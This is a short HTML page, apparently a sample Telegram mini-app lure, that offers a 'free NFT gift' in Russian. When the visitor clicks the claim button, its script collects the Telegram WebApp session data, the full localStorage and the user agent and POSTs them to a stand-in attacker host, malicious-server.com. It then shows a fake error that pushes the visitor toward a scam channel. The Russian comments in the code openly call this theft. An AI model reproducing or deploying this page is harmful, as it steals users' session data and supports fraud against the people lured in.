<!DOCTYPE html>
<html>
<head>
    <title>Бесплатный NFT-подарок</title>
</head>
<body>
    <button id="claim">Получить NFT-подарок</button>
    
    <script>
        document.getElementById('claim').addEventListener('click', function() {
            // Крадём данные сессии Telegram
            const tgData = JSON.stringify(window.Telegram.WebApp.initData);
            const localStorageData = JSON.stringify(localStorage);
            
            // Отправляем на сервер злоумышленника
            fetch('https://malicious-server.com/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    telegram_data: tgData,
                    local_storage: localStorageData,
                    user_agent: navigator.userAgent
                })
            });

            // Показываем фейковую загрузку
            setTimeout(() => {
                alert('Ошибка! Для получения подарка подпишитесь на канал: t.me/scam_channel');
            }, 2000);
        });
    </script>
</body>
</html>